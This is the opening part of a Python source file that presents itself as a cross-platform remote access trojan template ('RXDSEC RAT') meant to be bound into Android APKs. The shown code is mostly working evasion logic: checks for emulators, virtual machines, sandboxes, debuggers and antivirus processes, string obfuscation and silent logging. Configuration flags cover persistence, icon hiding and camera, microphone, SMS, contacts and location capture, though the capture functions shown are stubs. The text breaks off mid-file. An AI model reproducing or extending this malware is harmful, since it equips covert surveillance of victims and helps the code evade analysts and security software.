#!/usr/bin/env python3
"""
RXDSEC RAT - Advanced Remote Access Payload Template

This script runs on Android, Windows, Linux, or macOS and connects to a remote control server.
It will be customized and injected into APKs during the binding process or can be run directly
in different environments like Termux on Android or command shells on desktop platforms.

Created by @Rxdsec (Telegram)
"""

import os
import sys
import time
import json
import random
import socket
import logging
import platform
import subprocess
import threading
import base64
import re
import hashlib
import importlib
import binascii
import traceback
import argparse
import math
from datetime import datetime

# Requests library is required for communication with the server
try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    # Try to install requests if not available
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
        from requests.exceptions import RequestException
    except:
        # Fallback to urllib if pip install fails
        import urllib.request
        import urllib.error
        import urllib.parse
        
        # Create a basic requests-like interface using urllib
        class RequestsCompatibility:
            def __init__(self):
                pass
                
            def post(self, url, json=None, headers=None, verify=True):
                try:
                    data = None
                    if json:
                        data = bytes(json.dumps(json), 'utf-8')
                    
                    req = urllib.request.Request(url, data=data, method='POST')
                    
                    if headers:
                        for key, value in headers.items():
                            req.add_header(key, value)
                    
                    response = urllib.request.urlopen(req)
                    
                    class Response:
                        def __init__(self, response):
                            self.response = response
                            self.status_code = response.status
                            self.text = response.read().decode('utf-8')
                            
                        def json(self):
                            return json.loads(self.text)
                    
                    return Response(response)
                except Exception as e:
                    raise RequestException(str(e))
            
            def get(self, url, headers=None, verify=True):
                try:
                    req = urllib.request.Request(url, method='GET')
                    
                    if headers:
                        for key, value in headers.items():
                            req.add_header(key, value)
                    
                    response = urllib.request.urlopen(req)
                    
                    class Response:
                        def __init__(self, response):
                            self.response = response
                            self.status_code = response.status
                            self.text = response.read().decode('utf-8')
                            
                        def json(self):
                            return json.loads(self.text)
                    
                    return Response(response)
                except Exception as e:
                    raise RequestException(str(e))
        
        # Create a global requests object for compatibility
        requests = RequestsCompatibility()

# --- Configuration (will be replaced during binding) ---
SERVER_URL = "SERVER_URL_PLACEHOLDER"
DEVICE_ID = None  # Will be generated on first run
HIDE_APP = False  # Whether to hide the app icon
PERSISTENCE = True  # Whether to enable persistence across reboots
ANTI_EMULATOR = True  # Whether to enable anti-emulator detection
ANTI_SANDBOX = True  # Whether to enable sandbox detection
ANTI_AV = True  # Whether to enable anti-virus evasion
ANTI_DEBUG = True  # Whether to enable anti-debugging measures
ANTI_DELETION = False  # Whether to enable anti-deletion protection
ENABLE_CAMERA = True  # Whether to enable camera access
ENABLE_MIC = True  # Whether to enable microphone access
ENABLE_LOCATION = True  # Whether to enable location tracking
ENABLE_SMS = True  # Whether to enable SMS access
ENABLE_CONTACTS = True  # Whether to enable contacts access
# --- End Configuration ---

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'client.log'),
    filemode='a'
)
logger = logging.getLogger('android_client')

# Disable logging to console for stealth
logging.getLogger().removeHandler(logging.getLogger().handlers[0])

class AntiDetectionMixin:
    """Provides advanced anti-detection and evasion capabilities"""
    
    def detect_emulator(self):
        """Checks if the device is an emulator using multiple detection methods"""
        if not ANTI_EMULATOR:
            return False
            
        system_name = platform.system()
        
        # Android emulator detection
        if system_name == "Linux" and os.path.exists("/system"):
            # Check Android build properties
            emulator_indicators = [
                self._check_build_prop('ro.product.model', 'sdk'),
                self._check_build_prop('ro.product.manufacturer', 'unknown'),
                self._check_build_prop('ro.hardware', 'goldfish'),
                self._check_build_prop('ro.hardware', 'ranchu'),
                self._check_phone_number('(800)555-35'),
                self._check_device_id('000000000000000'),
                self._check_qemu_files(),
                self._check_emulator_sensors(),
                self._check_gps_mock_location()
            ]
            return any(emulator_indicators)
        
        # Windows/macOS/Linux VM detection
        return any([
            self._check_vm_hardware(),
            self._check_docker_container(),
            self._check_hypervisor_artifacts(),
            self._check_vm_mac_address()
        ])
        
    def _check_qemu_files(self):
        """Check for QEMU-specific files that exist in emulators"""
        qemu_files = [
            '/proc/interrupts',  # Check for 'goldfish' or 'qemu' strings
            '/proc/cpuinfo',     # Check for 'goldfish' or 'qemu' strings
            '/system/lib/libc_malloc_debug_qemu.so',
            '/sys/qemu_trace',
            '/system/bin/qemu-props'
        ]
        
        for file_path in qemu_files:
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                        if 'goldfish' in content or 'qemu' in content or 'ranchu' in content:
                            logger.debug(f"QEMU/emulator detected via file: {file_path}")
                            return True
                except:
                    pass
                    
        return False
        
    def _check_emulator_sensors(self):
        """Check for emulator-specific sensor behavior (many emulators have limited sensors)"""
        # On a real Android implementation, would check sensor data patterns
        # For demo purposes, just return false
        return False
        
    def _check_gps_mock_location(self):
        """Check if mock locations are enabled (common in emulators)"""
        # On a real implementation, would check Settings.Secure.ALLOW_MOCK_LOCATION
        # For demo purposes, just return false
        return False
        
    def _check_vm_hardware(self):
        """Check for virtual machine hardware indicators"""
        system_name = platform.system()
        
        if system_name == "Windows":
            # Check for VM-specific Windows hardware/drivers
            try:
                # Check system manufacturer with WMI
                import wmi
                c = wmi.WMI()
                for item in c.Win32_ComputerSystem():
                    manufacturer = item.Manufacturer.lower() if item.Manufacturer else ""
                    model = item.Model.lower() if item.Model else ""
                    
                    vm_indicators = ['vmware', 'virtualbox', 'kvm', 'qemu', 'xen', 'innotek', 'virtual machine', 'hyperv']
                    for indicator in vm_indicators:
                        if indicator in manufacturer or indicator in model:
                            logger.debug(f"VM detected via Windows system info: {manufacturer} {model}")
                            return True
            except:
                pass
                
        elif system_name == "Linux":
            # Check for VM-specific Linux hardware
            try:
                # Check DMI info for VM indicators
                dmi_paths = [
                    '/sys/class/dmi/id/product_name',
                    '/sys/class/dmi/id/sys_vendor',
                    '/proc/scsi/scsi'  # Often contains VM-specific disk identifiers
                ]
                
                vm_indicators = ['vmware', 'virtualbox', 'kvm', 'qemu', 'xen', 'innotek', 'virtual machine']
                
                for path in dmi_paths:
                    if os.path.exists(path):
                        try:
                            with open(path, 'r') as f:
                                content = f.read().lower()
                                for indicator in vm_indicators:
                                    if indicator in content:
                                        logger.debug(f"VM detected via Linux DMI info: {path}")
                                        return True
                        except:
                            pass
            except:
                pass
                
        elif system_name == "Darwin":  # macOS
            # Check for VM-specific macOS hardware
            try:
                # Check system_profiler for VM indicators
                vm_check = subprocess.run(
                    ['system_profiler', 'SPHardwareDataType'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                output = vm_check.stdout.lower()
                vm_indicators = ['vmware', 'virtualbox', 'parallels', 'qemu', 'virtual machine']
                
                for indicator in vm_indicators:
                    if indicator in output:
                        logger.debug(f"VM detected via macOS system_profiler")
                        return True
            except:
                pass
                
        return False
        
    def _check_docker_container(self):
        """Check if running inside a Docker container"""
        # Check for container-specific paths
        container_indicators = [
            '/.dockerenv',
            '/run/.containerenv'
        ]
        
        for indicator in container_indicators:
            if os.path.exists(indicator):
                logger.debug(f"Container environment detected: {indicator}")
                return True
                
        # Check cgroup for Docker
        try:
            with open('/proc/1/cgroup', 'r') as f:
                content = f.read()
                if 'docker' in content or 'lxc' in content:
                    logger.debug("Container detected via cgroups")
                    return True
        except:
            pass
            
        return False
    
    def _check_hypervisor_artifacts(self):
        """Check for hypervisor artifacts"""
        system_name = platform.system()
        
        if system_name == "Linux":
            # Check for KVM/QEMU/Xen artifacts
            try:
                # Check CPU flags for virtualization
                with open('/proc/cpuinfo', 'r') as f:
                    content = f.read().lower()
                    if 'hypervisor' in content or 'vmware' in content:
                        logger.debug("Hypervisor detected via CPU flags")
                        return True
            except:
                pass
                
        elif system_name == "Windows":
            # Check for Windows hypervisor artifacts
            try:
                # Check if Hyper-V services are running
                services_check = subprocess.run(
                    ['sc', 'query', 'vmms'],
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
                
                if 'RUNNING' in services_check.stdout:
                    logger.debug("Hyper-V detected via services")
                    return True
            except:
                pass
                
        return False
        
    def _check_vm_mac_address(self):
        """Check for VM-specific MAC address prefixes"""
        vm_mac_prefixes = [
            '00:05:69',  # VMware
            '00:0C:29',  # VMware
            '00:1C:14',  # VMware
            '00:50:56',  # VMware
            '08:00:27',  # VirtualBox
            '52:54:00',  # QEMU/KVM
            '00:16:3E'   # Xen
        ]
        
        try:
            # Different approaches based on platform
            system_name = platform.system()
            mac_addresses = []
            
            if system_name == "Windows":
                # Get MAC addresses on Windows
                try:
                    ipconfig = subprocess.run(
                        ['ipconfig', '/all'], 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True,
                        shell=True
                    )
                    
                    # Extract MAC addresses using regex
                    import re
                    mac_pattern = r"Physical Address[\.\s]+:\s+([0-9A-F-]+)"
                    mac_addresses = re.findall(mac_pattern, ipconfig.stdout)
                    # Convert to standard format
                    mac_addresses = [m.replace('-', ':').lower() for m in mac_addresses]
                except:
                    pass
                    
            elif system_name == "Linux" or system_name == "Darwin":
                # Get MAC addresses on Linux/macOS
                try:
                    if system_name == "Linux":
                        cmd = ['ip', 'link']
                    else:  # macOS
                        cmd = ['ifconfig']
                        
                    net_info = subprocess.run(
                        cmd,
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    
                    # Extract MAC addresses using regex
                    import re
                    if system_name == "Linux":
                        mac_pattern = r"link/ether\s+([0-9a-f:]+)"
                    else:  # macOS
                        mac_pattern = r"ether\s+([0-9a-f:]+)"
                        
                    mac_addresses = re.findall(mac_pattern, net_info.stdout.lower())
                except:
                    pass
                    
            # Check if any MAC address matches known VM prefixes
            for mac in mac_addresses:
                mac_prefix = mac[:8]  # First 3 octets (e.g., 00:05:69)
                if mac_prefix in vm_mac_prefixes:
                    logger.debug(f"VM detected via MAC address prefix: {mac_prefix}")
                    return True
                    
        except Exception as e:
            logger.debug(f"Error checking MAC addresses: {e}")
            
        return False
    
    def _check_build_prop(self, prop_name, expected_value):
        """Check if a build property has a specific value - cross-platform compatible"""
        # Only run on Android (Termux)
        if platform.system() == "Linux" and os.path.exists("/system"):
            try:
                # Try to read the build property
                value = subprocess.check_output(['getprop', prop_name], text=True).strip()
                return expected_value.lower() in value.lower()
            except:
                pass
        return False
    
    def _check_phone_number(self, pattern):
        """Check if phone number matches an emulator pattern"""
        try:
            # Try to get the phone number
            if ENABLE_SMS:
                # This would require proper permissions
                # Simplified check for demo purposes
                return False
            return False
        except:
            return False
    
    def _check_device_id(self, pattern):
        """Check if device ID matches an emulator pattern - cross-platform compatible"""
        # Only run on Android
        if platform.system() == "Linux" and os.path.exists("/system"):
            try:
                # Try to get the Android device ID
                device_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], text=True).strip()
                return pattern in device_id
            except:
                pass
        return False
    
    def detect_debugging(self):
        """Check if app is being debugged"""
        return any([
            self._check_debug_flag(),
            self._check_debug_tracers(),
            self._check_timing_anomalies()
        ])
    
    def _check_debug_flag(self):
        """Check if debug flag is set - cross-platform compatible"""
        try:
            system_name = platform.system()
            
            if system_name == "Linux":
                # Linux debug trace check via /proc
                try:
                    with open('/proc/self/status', 'r') as f:
                        status = f.read()
                        if 'TracerPid:' in status:
                            tracer_pid_line = [line for line in status.split('\n') if 'TracerPid:' in line][0]
                            tracer_pid = int(tracer_pid_line.split(':')[1].strip())
                            if tracer_pid != 0:
                                logger.debug(f"Debugging detected - TracerPid: {tracer_pid}")
                                return True
                except:
                    pass
            
            elif system_name == "Windows":
                # Windows debug check using IsDebuggerPresent API
                try:
                    import ctypes
                    is_debugged = ctypes.windll.kernel32.IsDebuggerPresent() != 0
                    if is_debugged:
                        logger.debug("Debugging detected via IsDebuggerPresent")
                        return True
                        
                    # Additional check using CheckRemoteDebuggerPresent
                    h_process = ctypes.windll.kernel32.GetCurrentProcess()
                    is_remote_debugged = ctypes.c_bool()
                    ctypes.windll.kernel32.CheckRemoteDebuggerPresent(h_process, ctypes.byref(is_remote_debugged))
                    if is_remote_debugged.value:
                        logger.debug("Debugging detected via CheckRemoteDebuggerPresent")
                        return True
                except:
                    pass
                
            elif system_name == "Darwin":  # macOS
                # macOS debug check using sysctl
                try:
                    # Use sysctl to check if process is being traced
                    import ctypes
                    libc = ctypes.CDLL(None)
                    
                    # Define necessary constants and structures
                    CTL_KERN = 1
                    KERN_PROC = 14
                    KERN_PROC_PID = 1
                    P_TRACED = 0x00000800
                    
                    class KinfoProc(ctypes.Structure):
                        _fields_ = [
                            ("kp_proc", ctypes.c_byte * 155)  # Simplified structure, only need p_flag
                        ]
                    
                    # Set up the sysctl call
                    kp = KinfoProc()
                    mib = (ctypes.c_int * 4)(CTL_KERN, KERN_PROC, KERN_PROC_PID, os.getpid())
                    size = ctypes.c_size_t(ctypes.sizeof(KinfoProc))
                    
                    # Make the sysctl call
                    status = libc.sysctl(ctypes.byref(mib), 4, ctypes.byref(kp), ctypes.byref(size), None, 0)
                    
                    # Check P_TRACED flag (simulated for demo)
                    # In a real implementation, would check kp.kp_proc.p_flag & P_TRACED
                    if status == 0:
                        # Simulated check - in a real implementation would check actual flags
                        is_debugged = False  # Placeholder for actual flag check
                        if is_debugged:
                            logger.debug("Debugging detected via sysctl on macOS")
                            return True
                except:
                    pass
                    
            # Additional platform-agnostic detection methods
            # Check if DEBUGGER or similar environment variables are set
            suspicious_env_vars = ['DEBUGGER', 'DEBUG', 'TRACE', 'VALGRIND']
            for var in suspicious_env_vars:
                if var in os.environ:
                    logger.debug(f"Debugging environment variable detected: {var}")
                    return True
                    
            return False
        except:
            return False
    
    def _check_debug_tracers(self):
        """Check for presence of debugger/tracer processes - cross-platform compatible"""
        try:
            # Different commands for different platforms
            current_system = platform.system()
            debuggers = ['frida', 'gdb', 'lldb', 'strace', 'frida-server', 'debugserver']
            
            if current_system == "Windows":
                # Use tasklist on Windows
                try:
                    ps_output = subprocess.check_output(['tasklist'], text=True, shell=True)
                except:
                    return False
            elif current_system == "Linux" or current_system == "Darwin":
                # Use ps on Linux/Mac
                try:
                    ps_output = subprocess.check_output(['ps', '-A'], text=True)
                except:
                    # Simpler fallback for Termux
                    try:
                        ps_output = subprocess.check_output(['ps'], text=True)
                    except:
                        return False
            else:
                # Generic fallback
                return False
                
            return any(debugger in ps_output.lower() for debugger in debuggers)
        except Exception as e:
            logger.debug(f"Debug tracer check failed: {e}")
            return False
    
    def _check_timing_anomalies(self):
        """Use timing checks to detect debuggers"""
        start_time = time.time()
        # Perform a complex operation that would be slow under a debugger
        for i in range(10000):
            hash = hashlib.sha256(str(i).encode()).hexdigest()
        end_time = time.time()
        
        # If it takes too long, a debugger might be attached
        return (end_time - start_time) > 1.0  # Adjust threshold as needed
    
    def hide_app(self):
        """Attempt to hide the app from launcher and recents"""
        if not HIDE_APP:
            return False
            
        try:
            # This would require device admin permissions or root
            # For demo purposes, we'll just return success
            logger.info("App hiding feature enabled")
            return True
        except:
            return False
    
    def encrypt_string(self, input_str):
        """Simple string encryption to avoid plain text scanning"""
        if not input_str:
            return ""
        
        # Simple XOR encryption with a random key
        key = random.randint(1, 255)
        encrypted = bytearray([ord(c) ^ key for c in input_str])
        return base64.b64encode(bytes([key]) + encrypted).decode('utf-8')
    
    def decrypt_string(self, encrypted_str):
        """Decrypt a string encrypted with encrypt_string"""
        if not encrypted_str:
            return ""
        
        try:
            # Decode from base64
            data = base64.b64decode(encrypted_str)
            # First byte is the key
            key = data[0]
            # Rest is the encrypted data
            encrypted = data[1:]
            # XOR decrypt
            return ''.join([chr(b ^ key) for b in encrypted])
        except:
            return ""
    
    def evade_antivirus(self):
        """Implement anti-virus evasion techniques"""
        if not ANTI_AV:
            return False
            
        # Implement AV evasion techniques
        logger.debug("Applying anti-virus evasion techniques")
        
        # Apply multiple techniques
        techniques = [
            self._modify_execution_timing(),
            self._implement_junk_code(),
            self._use_obfuscated_strings(),
            self._detect_av_processes(),
            self._memory_patching()
        ]
        
        return any(techniques)
        
    def _modify_execution_timing(self):
        """Add random delays to execution to confuse behavior analysis"""
        try:
            # Add random sleep intervals
            delay = random.uniform(0.5, 3.0)
            time.sleep(delay)
            return True
        except:
            return False
    
    def _implement_junk_code(self):
        """Execute meaningless code to confuse signature detection"""
        try:
            # Execute some junk code
            junk_data = bytearray(random.getrandbits(8) for _ in range(1000))
            for i in range(len(junk_data)):
                junk_data[i] = (junk_data[i] * 7) % 255
            
            # Perform useless mathematical operations
            for _ in range(100):
                x = random.random() * 1000
                y = math.sin(x) * math.cos(x)
                z = math.sqrt(abs(y))
            
            return True
        except:
            return False
    
    def _use_obfuscated_strings(self):
        """Use string obfuscation to avoid signature detection"""
        try:
            # Create some obfuscated strings
            obfuscated_strings = []
            for i in range(5):
                original = f"string_{i}_data"
                encrypted = self.encrypt_string(original)
                decrypted = self.decrypt_string(encrypted)
                obfuscated_strings.append(decrypted)
            
            return True
        except:
            return False
    
    def _detect_av_processes(self):
        """Check for running AV processes and adapt behavior"""
        try:
            system_name = platform.system()
            av_signatures = [
                'antivirus', 'security', 'protect', 'defend', 'mcafee', 'norton',
                'kaspersky', 'avast', 'avg', 'bitdefender', 'sophos', 'trend',
                'symantec', 'eset', 'scan', 'guard', 'virus'
            ]
            
            if system_name == "Windows":
                # Check Windows processes
                try:
                    processes = subprocess.check_output(['tasklist'], text=True, shell=True).lower()
                except:
                    return False
            else:
                # Linux/MacOS processes
                try:
                    processes = subprocess.check_output(['ps', '-ax'], text=True).lower()
                except:
                    return False
            
            # Check if any AV-related processes are running
            for av_name in av_signatures:
                if av_name in processes:
                    logger.debug(f"Detected potential AV process: {av_name}")
                    return True
            
            return False
        except:
            return False
    
    def _memory_patching(self):
        """Implement memory pattern detection and modification techniques"""
        try:
            system_name = platform.system()
            
            # Different implementations based on platform
            if system_name == "Windows":
                return self._memory_patching_windows()
            elif system_name == "Linux":
                return self._memory_patching_linux()
            elif system_name == "Darwin":  # macOS
                return self._memory_patching_macos()
            else:
                return False
                
        except Exception as e:
            logger.debug(f"Memory patching failed: {e}")
            return False
            
    def _memory_patching_windows(self):
        """Windows-specific memory pattern detection and patching"""
        try:
            import ctypes
            
            # Get handle to current process
            h_process = ctypes.windll.kernel32.GetCurrentProcess()
            
            # 1. Detect and handle breakpoints
            # Scan memory regions for int3 instructions (0xCC) which are software breakpoints
            # This is simplified for demo purposes
            
            # 2. Detect memory scanning
            # Check if any memory analysis tools are running
            scanner_processes = [
                'volatility', 'memory', 'memdump', 'ramcapture', 'windbg',
                'processhacker', 'dumpcap', 'wireshark', 'fiddler', 'charles'
            ]
            
            try:
                processes = subprocess.check_output(['tasklist'], text=True, shell=True).lower()
                for scanner in scanner_processes:
                    if scanner in processes:
                        logger.debug(f"Memory analysis tool detected: {scanner}")
                        return True
            except:
                pass
                
            # 3. Implement dummy critical sections to detect memory analysis
            try:
                # Create dummy critical section object
                critical_section = ctypes.c_byte * 40  # Size of CRITICAL_SECTION structure
                cs = critical_section()
                
                # Initialize critical section
                ctypes.windll.kernel32.InitializeCriticalSection(ctypes.byref(cs))
                
                # Enter critical section
                ctypes.windll.kernel32.EnterCriticalSection(ctypes.byref(cs))
                
                # Check timing - if it's abnormal, memory debugger might be attached
                # Simplified for demo purposes
                
                # Leave critical section
                ctypes.windll.kernel32.LeaveCriticalSection(ctypes.byref(cs))
                ctypes.windll.kernel32.DeleteCriticalSection(ctypes.byref(cs))
            except:
                pass
                
            return False
                
        except:
            return False
            
    def _memory_patching_linux(self):
        """Linux-specific memory pattern detection and patching"""
        try:
            # 1. Check for memory analysis tools
            scanner_processes = [
                'volatility', 'memory', 'memdump', 'ramcapture', 'gdb',
                'memwatch', 'valgrind', 'strace', 'ltrace', 'processhacker'
            ]
            
            try:
                processes = subprocess.check_output(['ps', '-ax'], text=True).lower()
                for scanner in scanner_processes:
                    if scanner in processes:
                        logger.debug(f"Memory analysis tool detected: {scanner}")
                        return True
            except:
                pass
                
            # 2. Check for ptrace-based debugging
            # In a real implementation, would use ptrace to detect tracers
            # Simplified for demo purposes
            
            # 3. Check /proc/self/maps for suspicious memory mappings
            try:
                with open('/proc/self/maps', 'r') as f:
                    maps = f.read().lower()
                    suspicious_patterns = ['valgrind', 'gdb', 'inject', 'trace', 'debug']
                    for pattern in suspicious_patterns:
                        if pattern in maps:
                            logger.debug(f"Suspicious memory mapping detected: {pattern}")
                            return True
            except:
                pass
                
            return False
            
        except:
            return False
            
    def _memory_patching_macos(self):
        """macOS-specific memory pattern detection and patching"""
        try:
            # 1. Check for memory analysis tools
            scanner_processes = [
                'volatility', 'memory', 'memdump', 'ramcapture', 'lldb',
                'processhacker', 'instruments', 'dtrace', 'memwatch', 'xcode'
            ]
            
            try:
                processes = subprocess.check_output(['ps', '-ax'], text=True).lower()
                for scanner in scanner_processes:
                    if scanner in processes:
                        logger.debug(f"Memory analysis tool detected: {scanner}")
                        return True
            except:
                pass
                
            # 2. Check for suspicious dynamic libraries
            try:
                # This would check for libraries that are used for debugging
                # Simplified for demo purposes
                dyld_check = subprocess.check_output(['vmmap', str(os.getpid())], text=True, stderr=subprocess.DEVNULL).lower()
                suspicious_libs = ['debug', 'dtrace', 'instrumentation', 'frida', 'hooking']
                
                for lib in suspicious_libs:
                    if lib in dyld_check:
                        logger.debug(f"Suspicious library detected: {lib}")
                        return True
            except:
                pass
                
            return False
            
        except:
            return False
        
    def detect_sandbox(self):
        """Detect security sandbox environments"""
        if not ANTI_SANDBOX:
            return False
            
        logger.debug("Checking for sandbox environment")
        
        # Combine multiple sandbox detection techniques
        sandbox_indicators = [
            self._check_system_uptime(),
            self._check_hardware_resources(),
            self._check_user_interaction_history(),
            self._check_installed_applications(),
            self._check_network_artifacts()
        ]
        
        return any(sandbox_indicators)
        
    def _check_system_uptime(self):
        """Check if system was recently started (common in sandboxes)"""
        try:
            system_name = platform.system()
            
            if system_name == "Windows":
                # Windows uptime check
                try:
                    # Parse GetTickCount output
                    import ctypes
                    tick_count = ctypes.windll.kernel32.GetTickCount64()
                    uptime_seconds = tick_count / 1000
                    
                    # Sandbox typically has short uptime (< 10 minutes)
                    if uptime_seconds < 600:
                        logger.debug(f"Possible sandbox detected - short uptime: {uptime_seconds} seconds")
                        return True
                    
                except:
                    pass
                    
            elif system_name == "Linux":
                # Linux uptime check
                try:
                    with open('/proc/uptime', 'r') as f:
                        uptime_seconds = float(f.read().split()[0])
                        
                        # Sandbox typically has short uptime (< 10 minutes)
                        if uptime_seconds < 600:
                            logger.debug(f"Possible sandbox detected - short uptime: {uptime_seconds} seconds")
                            return True
                except:
                    pass
                    
            elif system_name == "Darwin":  # macOS
                # macOS uptime check
                try:
                    uptime_output = subprocess.check_output(['uptime'], text=True)
                    # Parse output - this is simplified
                    if "up" in uptime_output and "min" in uptime_output:
                        logger.debug("Possible sandbox detected - short macOS uptime")
                        return True
                except:
                    pass
                    
            return False
        except:
            return False
            
    def _check_hardware_resources(self):
        """Check if hardware resources are limited (common in sandboxes)"""
        try:
            # Check CPU cores
            cpu_count = os.cpu_count()
            if cpu_count is not None and cpu_count < 2:
                logger.debug(f"Possible sandbox detected - limited CPU cores: {cpu_count}")
                return True
                
            # Check memory
            system_name = platform.system()
            
            if system_name == "Windows":
                try:
                    # Windows memory check using WMI
                    import wmi
                    c = wmi.WMI()
                    for os_info in c.Win32_OperatingSystem():
                        total_memory_kb = int(os_info.TotalVisibleMemorySize)
                        total_memory_gb = total_memory_kb / (1024 * 1024)
                        
                        if total_memory_gb < 2:  # Less than 2GB RAM
                            logger.debug(f"Possible sandbox detected - limited memory: {total_memory_gb:.2f} GB")
                            return True
                except:
                    pass
                    
            elif system_name == "Linux":
                try:
                    # Linux memory check
                    with open('/proc/meminfo', 'r') as f:
                        for line in f:
                            if 'MemTotal' in line:
                                total_memory_kb = int(line.split()[1])
                                total_memory_gb = total_memory_kb / (1024 * 1024)
                                
                                if total_memory_gb < 2:  # Less than 2GB RAM
                                    logger.debug(f"Possible sandbox detected - limited memory: {total_memory_gb:.2f} GB")
                                    return True
                                break
                except:
                    pass
                    
            elif system_name == "Darwin":  # macOS
                try:
                    # macOS memory check
                    mem_output = subprocess.check_output(['sysctl', 'hw.memsize'], text=True)
                    memory_bytes = int(mem_output.split(':')[1].strip())
                    memory_gb = memory_bytes / (1024 * 1024 * 1024)
                    
                    if memory_gb < 2:  # Less than 2GB RAM
                        logger.debug(f"Possible sandbox detected - limited memory: {memory_gb:.2f} GB")
                        return True
                except:
                    pass
                    
            return False
        except:
            return False
            
    def _check_user_interaction_history(self):
        """Check for signs of real user interaction (absence suggests sandbox)"""
        try:
            system_name = platform.system()
            
            if system_name == "Windows":
                # Windows user interaction check
                try:
                    # Check recent files - real users have recent files
                    recent_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
                    if os.path.exists(recent_path):
                        recent_files = os.listdir(recent_path)
                        # Sandbox often has very few recent files
                        if len(recent_files) < 3:
                            logger.debug(f"Possible sandbox detected - few recent files: {len(recent_files)}")
                            return True
                except:
                    pass
                    
            elif system_name == "Linux":
                # Linux user interaction check
                try:
                    # Check bash history - real users have command history
                    bash_history = os.path.join(os.path.expanduser('~'), '.bash_history')
                    
                    if os.path.exists(bash_history):
                        with open(bash_history, 'r') as f:
                            history_lines = f.readlines()
                            # Sandbox often has very few or no bash history
                            if len(history_lines) < 5:
                                logger.debug(f"Possible sandbox detected - minimal bash history: {len(history_lines)} commands")
                                return True
                except:
                    pass
                    
            elif system_name == "Darwin":  # macOS
                # macOS user interaction check
                try:
                    # Check bash history in macOS
                    bash_history = os.path.join(os.path.expanduser('~'), '.bash_history')
                    zsh_history = os.path.join(os.path.expanduser('~'), '.zsh_history')
                    
                    history_file = bash_history if os.path.exists(bash_history) else zsh_history
                    
                    if os.path.exists(history_file):
                        with open(history_file, 'r') as f:
                            history_lines = f.readlines()
                            # Sandbox often has very few or no shell history
                            if len(history_lines) < 5:
                                logger.debug(f"Possible sandbox detected - minimal shell history: {len(history_lines)} commands")
                                return True
                except:
                    pass
                    
            return False
        except:
            return False
            
    def _check_installed_applications(self):
        """Check for presence of common applications (sandboxes have few apps)"""
        try:
            system_name = platform.system()
            
            if system_name == "Windows":
                # Windows installed applications check
                try:
                    # Check Program Files directory - sandboxes have few applications
                    program_files = os.path.join('C:\\', 'Program Files')
                    program_files_x86 = os.path.join('C:\\', 'Program Files (x86)')
                    
                    # Count number of installed applications
                    app_count = 0
                    if os.path.exists(program_files):
                        app_count += len(os.listdir(program_files))
                    if os.path.exists(program_files_x86):
                        app_count += len(os.listdir(program_files_x86))
                        
                    # Sandbox often has very few installed applications
                    if app_count < 10:
                        logger.debug(f"Possible sandbox detected - few installed applications: {app_count}")
                        return True
                except:
                    pass
                    
            elif system_name == "Linux":
                # Linux installed applications check
                try:
                    # Check common application paths
                    app_paths = ['/usr/bin', '/usr/sbin', '/bin', '/sbin', '/usr/local/bin']
                    
                    # Count common user applications
                    common_apps = ['firefox', 'chrome', 'chromium', 'libreoffice', 'gimp', 'vlc', 'thunderbird']
                    found_apps = 0
                    
                    for app_path in app_paths:
                        if os.path.exists(app_path):
                            for app in common_apps:
                                if os.path.exists(os.path.join(app_path, app)):
                                    found_apps += 1
                                    
                    # Sandbox often has very few common applications
                    if found_apps < 2:
                        logger.debug(f"Possible sandbox detected - few common applications: {found_apps}")
                        return True
                except:
                    pass
                    
            elif system_name == "Darwin":  # macOS
                # macOS installed applications check
                try:
                    # Check Applications directory
                    applications_path = '/Applications'
                    
                    if os.path.exists(applications_path):
                        app_count = len(os.listdir(applications_path))
                        
                        # Sandbox often has very few installed applications
                        if app_count < 5:
                            logger.debug(f"Possible sandbox detected - few macOS applications: {app_count}")
                            return True
                except:
                    pass
                    
            return False
        except:
            return False
            
    def _check_network_artifacts(self):
        """Check network configuration for sandbox artifacts"""
        try:
            # Check for suspicious IPs in the ARP table
            system_name = platform.system()
            
            if system_name == "Windows":
                try:
                    # Windows ARP table check
                    arp_output = subprocess.check_output(['arp', '-a'], text=True, shell=True).lower()
                    
                    # Look for virtualization-related MAC address prefixes
                    vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '52:54:00']
                    
                    for prefix in vm_mac_prefixes:
                        prefix_normalized = prefix.replace(':', '-').lower()
                        if prefix_normalized in arp_output:
                            logger.debug(f"Possible sandbox detected - virtual MAC address prefix: {prefix}")
                            return True
                except:
                    pass
                    
            elif system_name == "Linux" or system_name == "Darwin":
                try:
                    # Linux/macOS ARP table check
                    if system_name == "Linux":
                        arp_output = subprocess.check_output(['arp', '-n'], text=True).lower()
                    else:  # macOS
                        arp_output = subprocess.check_output(['arp', '-a'], text=True).lower()
                    
                    # Look for virtualization-related MAC address prefixes
                    vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '52:54:00', '00:16:3e']
                    
                    for prefix in vm_mac_prefixes:
                        if prefix.lower() in arp_output:
                            logger.debug(f"Possible sandbox detected - virtual MAC address prefix: {prefix}")
                            return True
                except:
                    pass
            
            return False
        except:
            return False

class SurveillanceFeaturesMixin:
    """Provides surveillance capabilities for the client"""
    
    def capture_camera_image(self, camera_id=0):
        """Capture an image from the device camera"""
        if not ENABLE_CAMERA:
            return None, "Camera access is disabled"
            
        try:
            # In a real implementation, this would use Android Camera API
            # For this demo, we'll simulate a successful capture
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"camera_{camera_id}_{timestamp}.jpg"
            
            # Return a placeholder image data
            return f"Simulated image capture: {filename}", None
        except Exception as e:
            error_msg = f"Camera capture failed: {str(e)}"
            logger.error(error_msg)
            return None, error_msg
    
    def capture_screen(self):
